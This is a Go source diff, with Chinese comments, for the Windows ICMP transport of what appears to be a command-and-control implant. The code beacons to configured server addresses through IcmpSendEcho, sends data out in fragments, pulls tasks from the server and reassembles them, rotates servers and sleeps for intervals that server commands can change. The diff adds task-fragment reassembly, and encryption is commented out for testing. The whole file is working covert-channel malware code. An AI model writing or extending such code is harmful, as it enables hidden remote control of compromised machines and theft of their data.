@@ -1,9 +1,11 @@
+//go:build windows
 // +build windows
 
 package main
 
 import (
 	"encoding/binary"
+	"errors"
 	"gopher/utils"
 	"syscall"
 	"time"
@@ -46,12 +48,12 @@ type IcmpEchoReply struct {
 }
 
 var (
-	iphlpapi          = syscall.NewLazyDLL("iphlpapi.dll")
-	ws2_32            = syscall.NewLazyDLL("ws2_32.dll")
-	icmpCreateFile    = iphlpapi.NewProc("IcmpCreateFile")
-	icmpSendEcho      = iphlpapi.NewProc("IcmpSendEcho")
-	icmpCloseHandle   = iphlpapi.NewProc("IcmpCloseHandle")
-	inet_addr         = ws2_32.NewProc("inet_addr")
+	iphlpapi        = syscall.NewLazyDLL("iphlpapi.dll")
+	ws2_32          = syscall.NewLazyDLL("ws2_32.dll")
+	icmpCreateFile  = iphlpapi.NewProc("IcmpCreateFile")
+	icmpSendEcho    = iphlpapi.NewProc("IcmpSendEcho")
+	icmpCloseHandle = iphlpapi.NewProc("IcmpCloseHandle")
+	inet_addr       = ws2_32.NewProc("inet_addr")
 )
 
 // ICMPConnection ICMP连接结构
@@ -97,7 +99,7 @@ func (ic *ICMPConnection) SendData(data []byte) error {
 
 	if len(data) <= maxPayload {
 		// 单包发送
-		_, err := ic.sendPacket(TYPE_BEACON_DATA, 0, 0, data)
+		_, _, err := ic.sendPacket(TYPE_BEACON_DATA, 0, 0, data)
 		return err
 	}
 
@@ -119,7 +121,8 @@ func (ic *ICMPConnection) SendData(data []byte) error {
 			flags |= LAST_FRAG
 		}
 
-		_, err := ic.sendPacket(TYPE_BEACON_DATA, flags, uint32(i), data[start:end])
+		// Windows IcmpSendEcho 是同步的，会等待响应（相当于等待ACK）
+		_, _, err := ic.sendPacket(TYPE_BEACON_DATA, flags, uint32(i), data[start:end])
 		if err != nil {
 			return err
 		}
@@ -128,14 +131,72 @@ func (ic *ICMPConnection) SendData(data []byte) error {
 	return nil
 }
 
-// RequestResponse 请求并接收响应
+// RequestResponse 请求并接收响应（支持分片重组）
 func (ic *ICMPConnection) RequestResponse() ([]byte, error) {
 	// 发送请求
-	return ic.sendPacket(TYPE_REQUEST_REPLY, 0, 0, nil)
+	respHeader, payload, err := ic.sendPacket(TYPE_REQUEST_REPLY, 0, 0, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	// 如果没有数据或不是TASK类型
+	if respHeader == nil || respHeader.Type != TYPE_TASK {
+		return nil, nil
+	}
+
+	// 检查是否需要分片重组
+	if respHeader.Flags&FRAGMENTED == 0 {
+		// 单包数据，直接返回
+		return payload, nil
+	}
+
+	// 需要分片重组
+	return ic.receiveFragmentedData(respHeader, payload)
+}
+
+// receiveFragmentedData 接收分片数据并重组
+func (ic *ICMPConnection) receiveFragmentedData(firstHeader *ICMPHeader, firstPayload []byte) ([]byte, error) {
+	var result []byte
+	result = append(result, firstPayload...)
+
+	// 如果第一个包就是最后一个分片
+	if firstHeader.Flags&LAST_FRAG != 0 {
+		return result, nil
+	}
+
+	fragIndex := uint32(1)
+
+	for {
+		// 请求下一个分片
+		respHeader, payload, err := ic.sendPacket(TYPE_REQUEST_REPLY, FETCH_FRAG, fragIndex, nil)
+		if err != nil {
+			return nil, err
+		}
+
+		if respHeader == nil || respHeader.Type != TYPE_TASK {
+			return nil, errors.New("unexpected response type during fragment reassembly")
+		}
+
+		result = append(result, payload...)
+
+		// 检查是否是最后一个分片
+		if respHeader.Flags&LAST_FRAG != 0 {
+			break
+		}
+
+		fragIndex++
+
+		// 防止无限循环
+		if fragIndex > 1000 {
+			return nil, errors.New("too many fragments")
+		}
+	}
+
+	return result, nil
 }
 
 // sendPacket 发送单个ICMP包并接收响应
-func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex uint32, payload []byte) ([]byte, error) {
+func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex uint32, payload []byte) (*ICMPHeader, []byte, error) {
 	// 构建自定义协议头
 	header := make([]byte, CUSTOM_HEADER_SIZE)
 	binary.LittleEndian.PutUint32(header[0:4], packetType)
@@ -158,21 +219,21 @@ func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex 
 		0,
 		uintptr(unsafe.Pointer(&replyBuf[0])),
 		uintptr(replySize),
-		uintptr(5000), // 5秒超时
+		uintptr(10000), // 10秒超时
 	)
 
 	if ret == 0 {
-		return nil, err
+		return nil, nil, err
 	}
 
 	// 解析响应
 	reply := (*IcmpEchoReply)(unsafe.Pointer(&replyBuf[0]))
 	if reply.Status != 0 {
-		return nil, nil
+		return nil, nil, nil
 	}
 
 	if reply.DataSize < CUSTOM_HEADER_SIZE {
-		return nil, nil
+		return nil, nil, nil
 	}
 
 	// 获取响应数据
@@ -183,17 +244,8 @@ func (ic *ICMPConnection) sendPacket(packetType uint32, flags uint32, fragIndex 
 
 	respHeader := parseHeader(replyData[:CUSTOM_HEADER_SIZE])
 
-	// 如果是ACK包，返回nil
-	if respHeader.Type == TYPE_ACK {
-		return nil, nil
-	}
-
-	// 如果是TASK包，返回数据
-	if respHeader.Type == TYPE_TASK {
-		return replyData[CUSTOM_HEADER_SIZE:], nil
-	}
-
-	return nil, nil
+	// 返回header和payload
+	return &respHeader, replyData[CUSTOM_HEADER_SIZE:], nil
 }
 
 // parseHeader 解析协议头
@@ -207,17 +259,18 @@ func parseHeader(data []byte) ICMPHeader {
 }
 
 // RunICMPLoop ICMP通信主循环
-func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
+// 注意: prof 参数仅用于初始化，循环中使用全局 profile 以支持 sleep 命令动态修改
+func RunICMPLoop(prof utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
 	addrIndex := 0
 
-	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
+	for i := 0; i < prof.ConnCount && ACTIVE; i++ {
 		if i > 0 {
-			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
-			addrIndex = (addrIndex + 1) % len(profile.Addresses)
+			time.Sleep(time.Duration(prof.ConnTimeout) * time.Second)
+			addrIndex = (addrIndex + 1) % len(prof.Addresses)
 		}
 
 		// 创建ICMP连接
-		icmpConn, err := NewICMPConnection(profile.Addresses[addrIndex], agentId, profile.MaxFragmentSize)
+		icmpConn, err := NewICMPConnection(prof.Addresses[addrIndex], agentId, prof.MaxFragmentSize)
 		if err != nil {
 			continue
 		}
@@ -240,6 +293,7 @@ func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey [
 			}
 
 			if len(recvData) == 0 {
+				// 使用全局 profile.SleepTime，支持 sleep 命令动态修改
 				time.Sleep(time.Duration(profile.SleepTime) * time.Second)
 				continue
 			}
@@ -249,10 +303,10 @@ func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey [
 			// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
 			// TODO: Encryption disabled for testing, enable after functionality test passes
 			/*
-			recvData, err = utils.DecryptData(recvData, sessionKey)
-			if err != nil {
-				break
-			}
+				recvData, err = utils.DecryptData(recvData, sessionKey)
+				if err != nil {
+					break
+				}
 			*/
 
 			err = msgpack.Unmarshal(recvData, &inMessage)
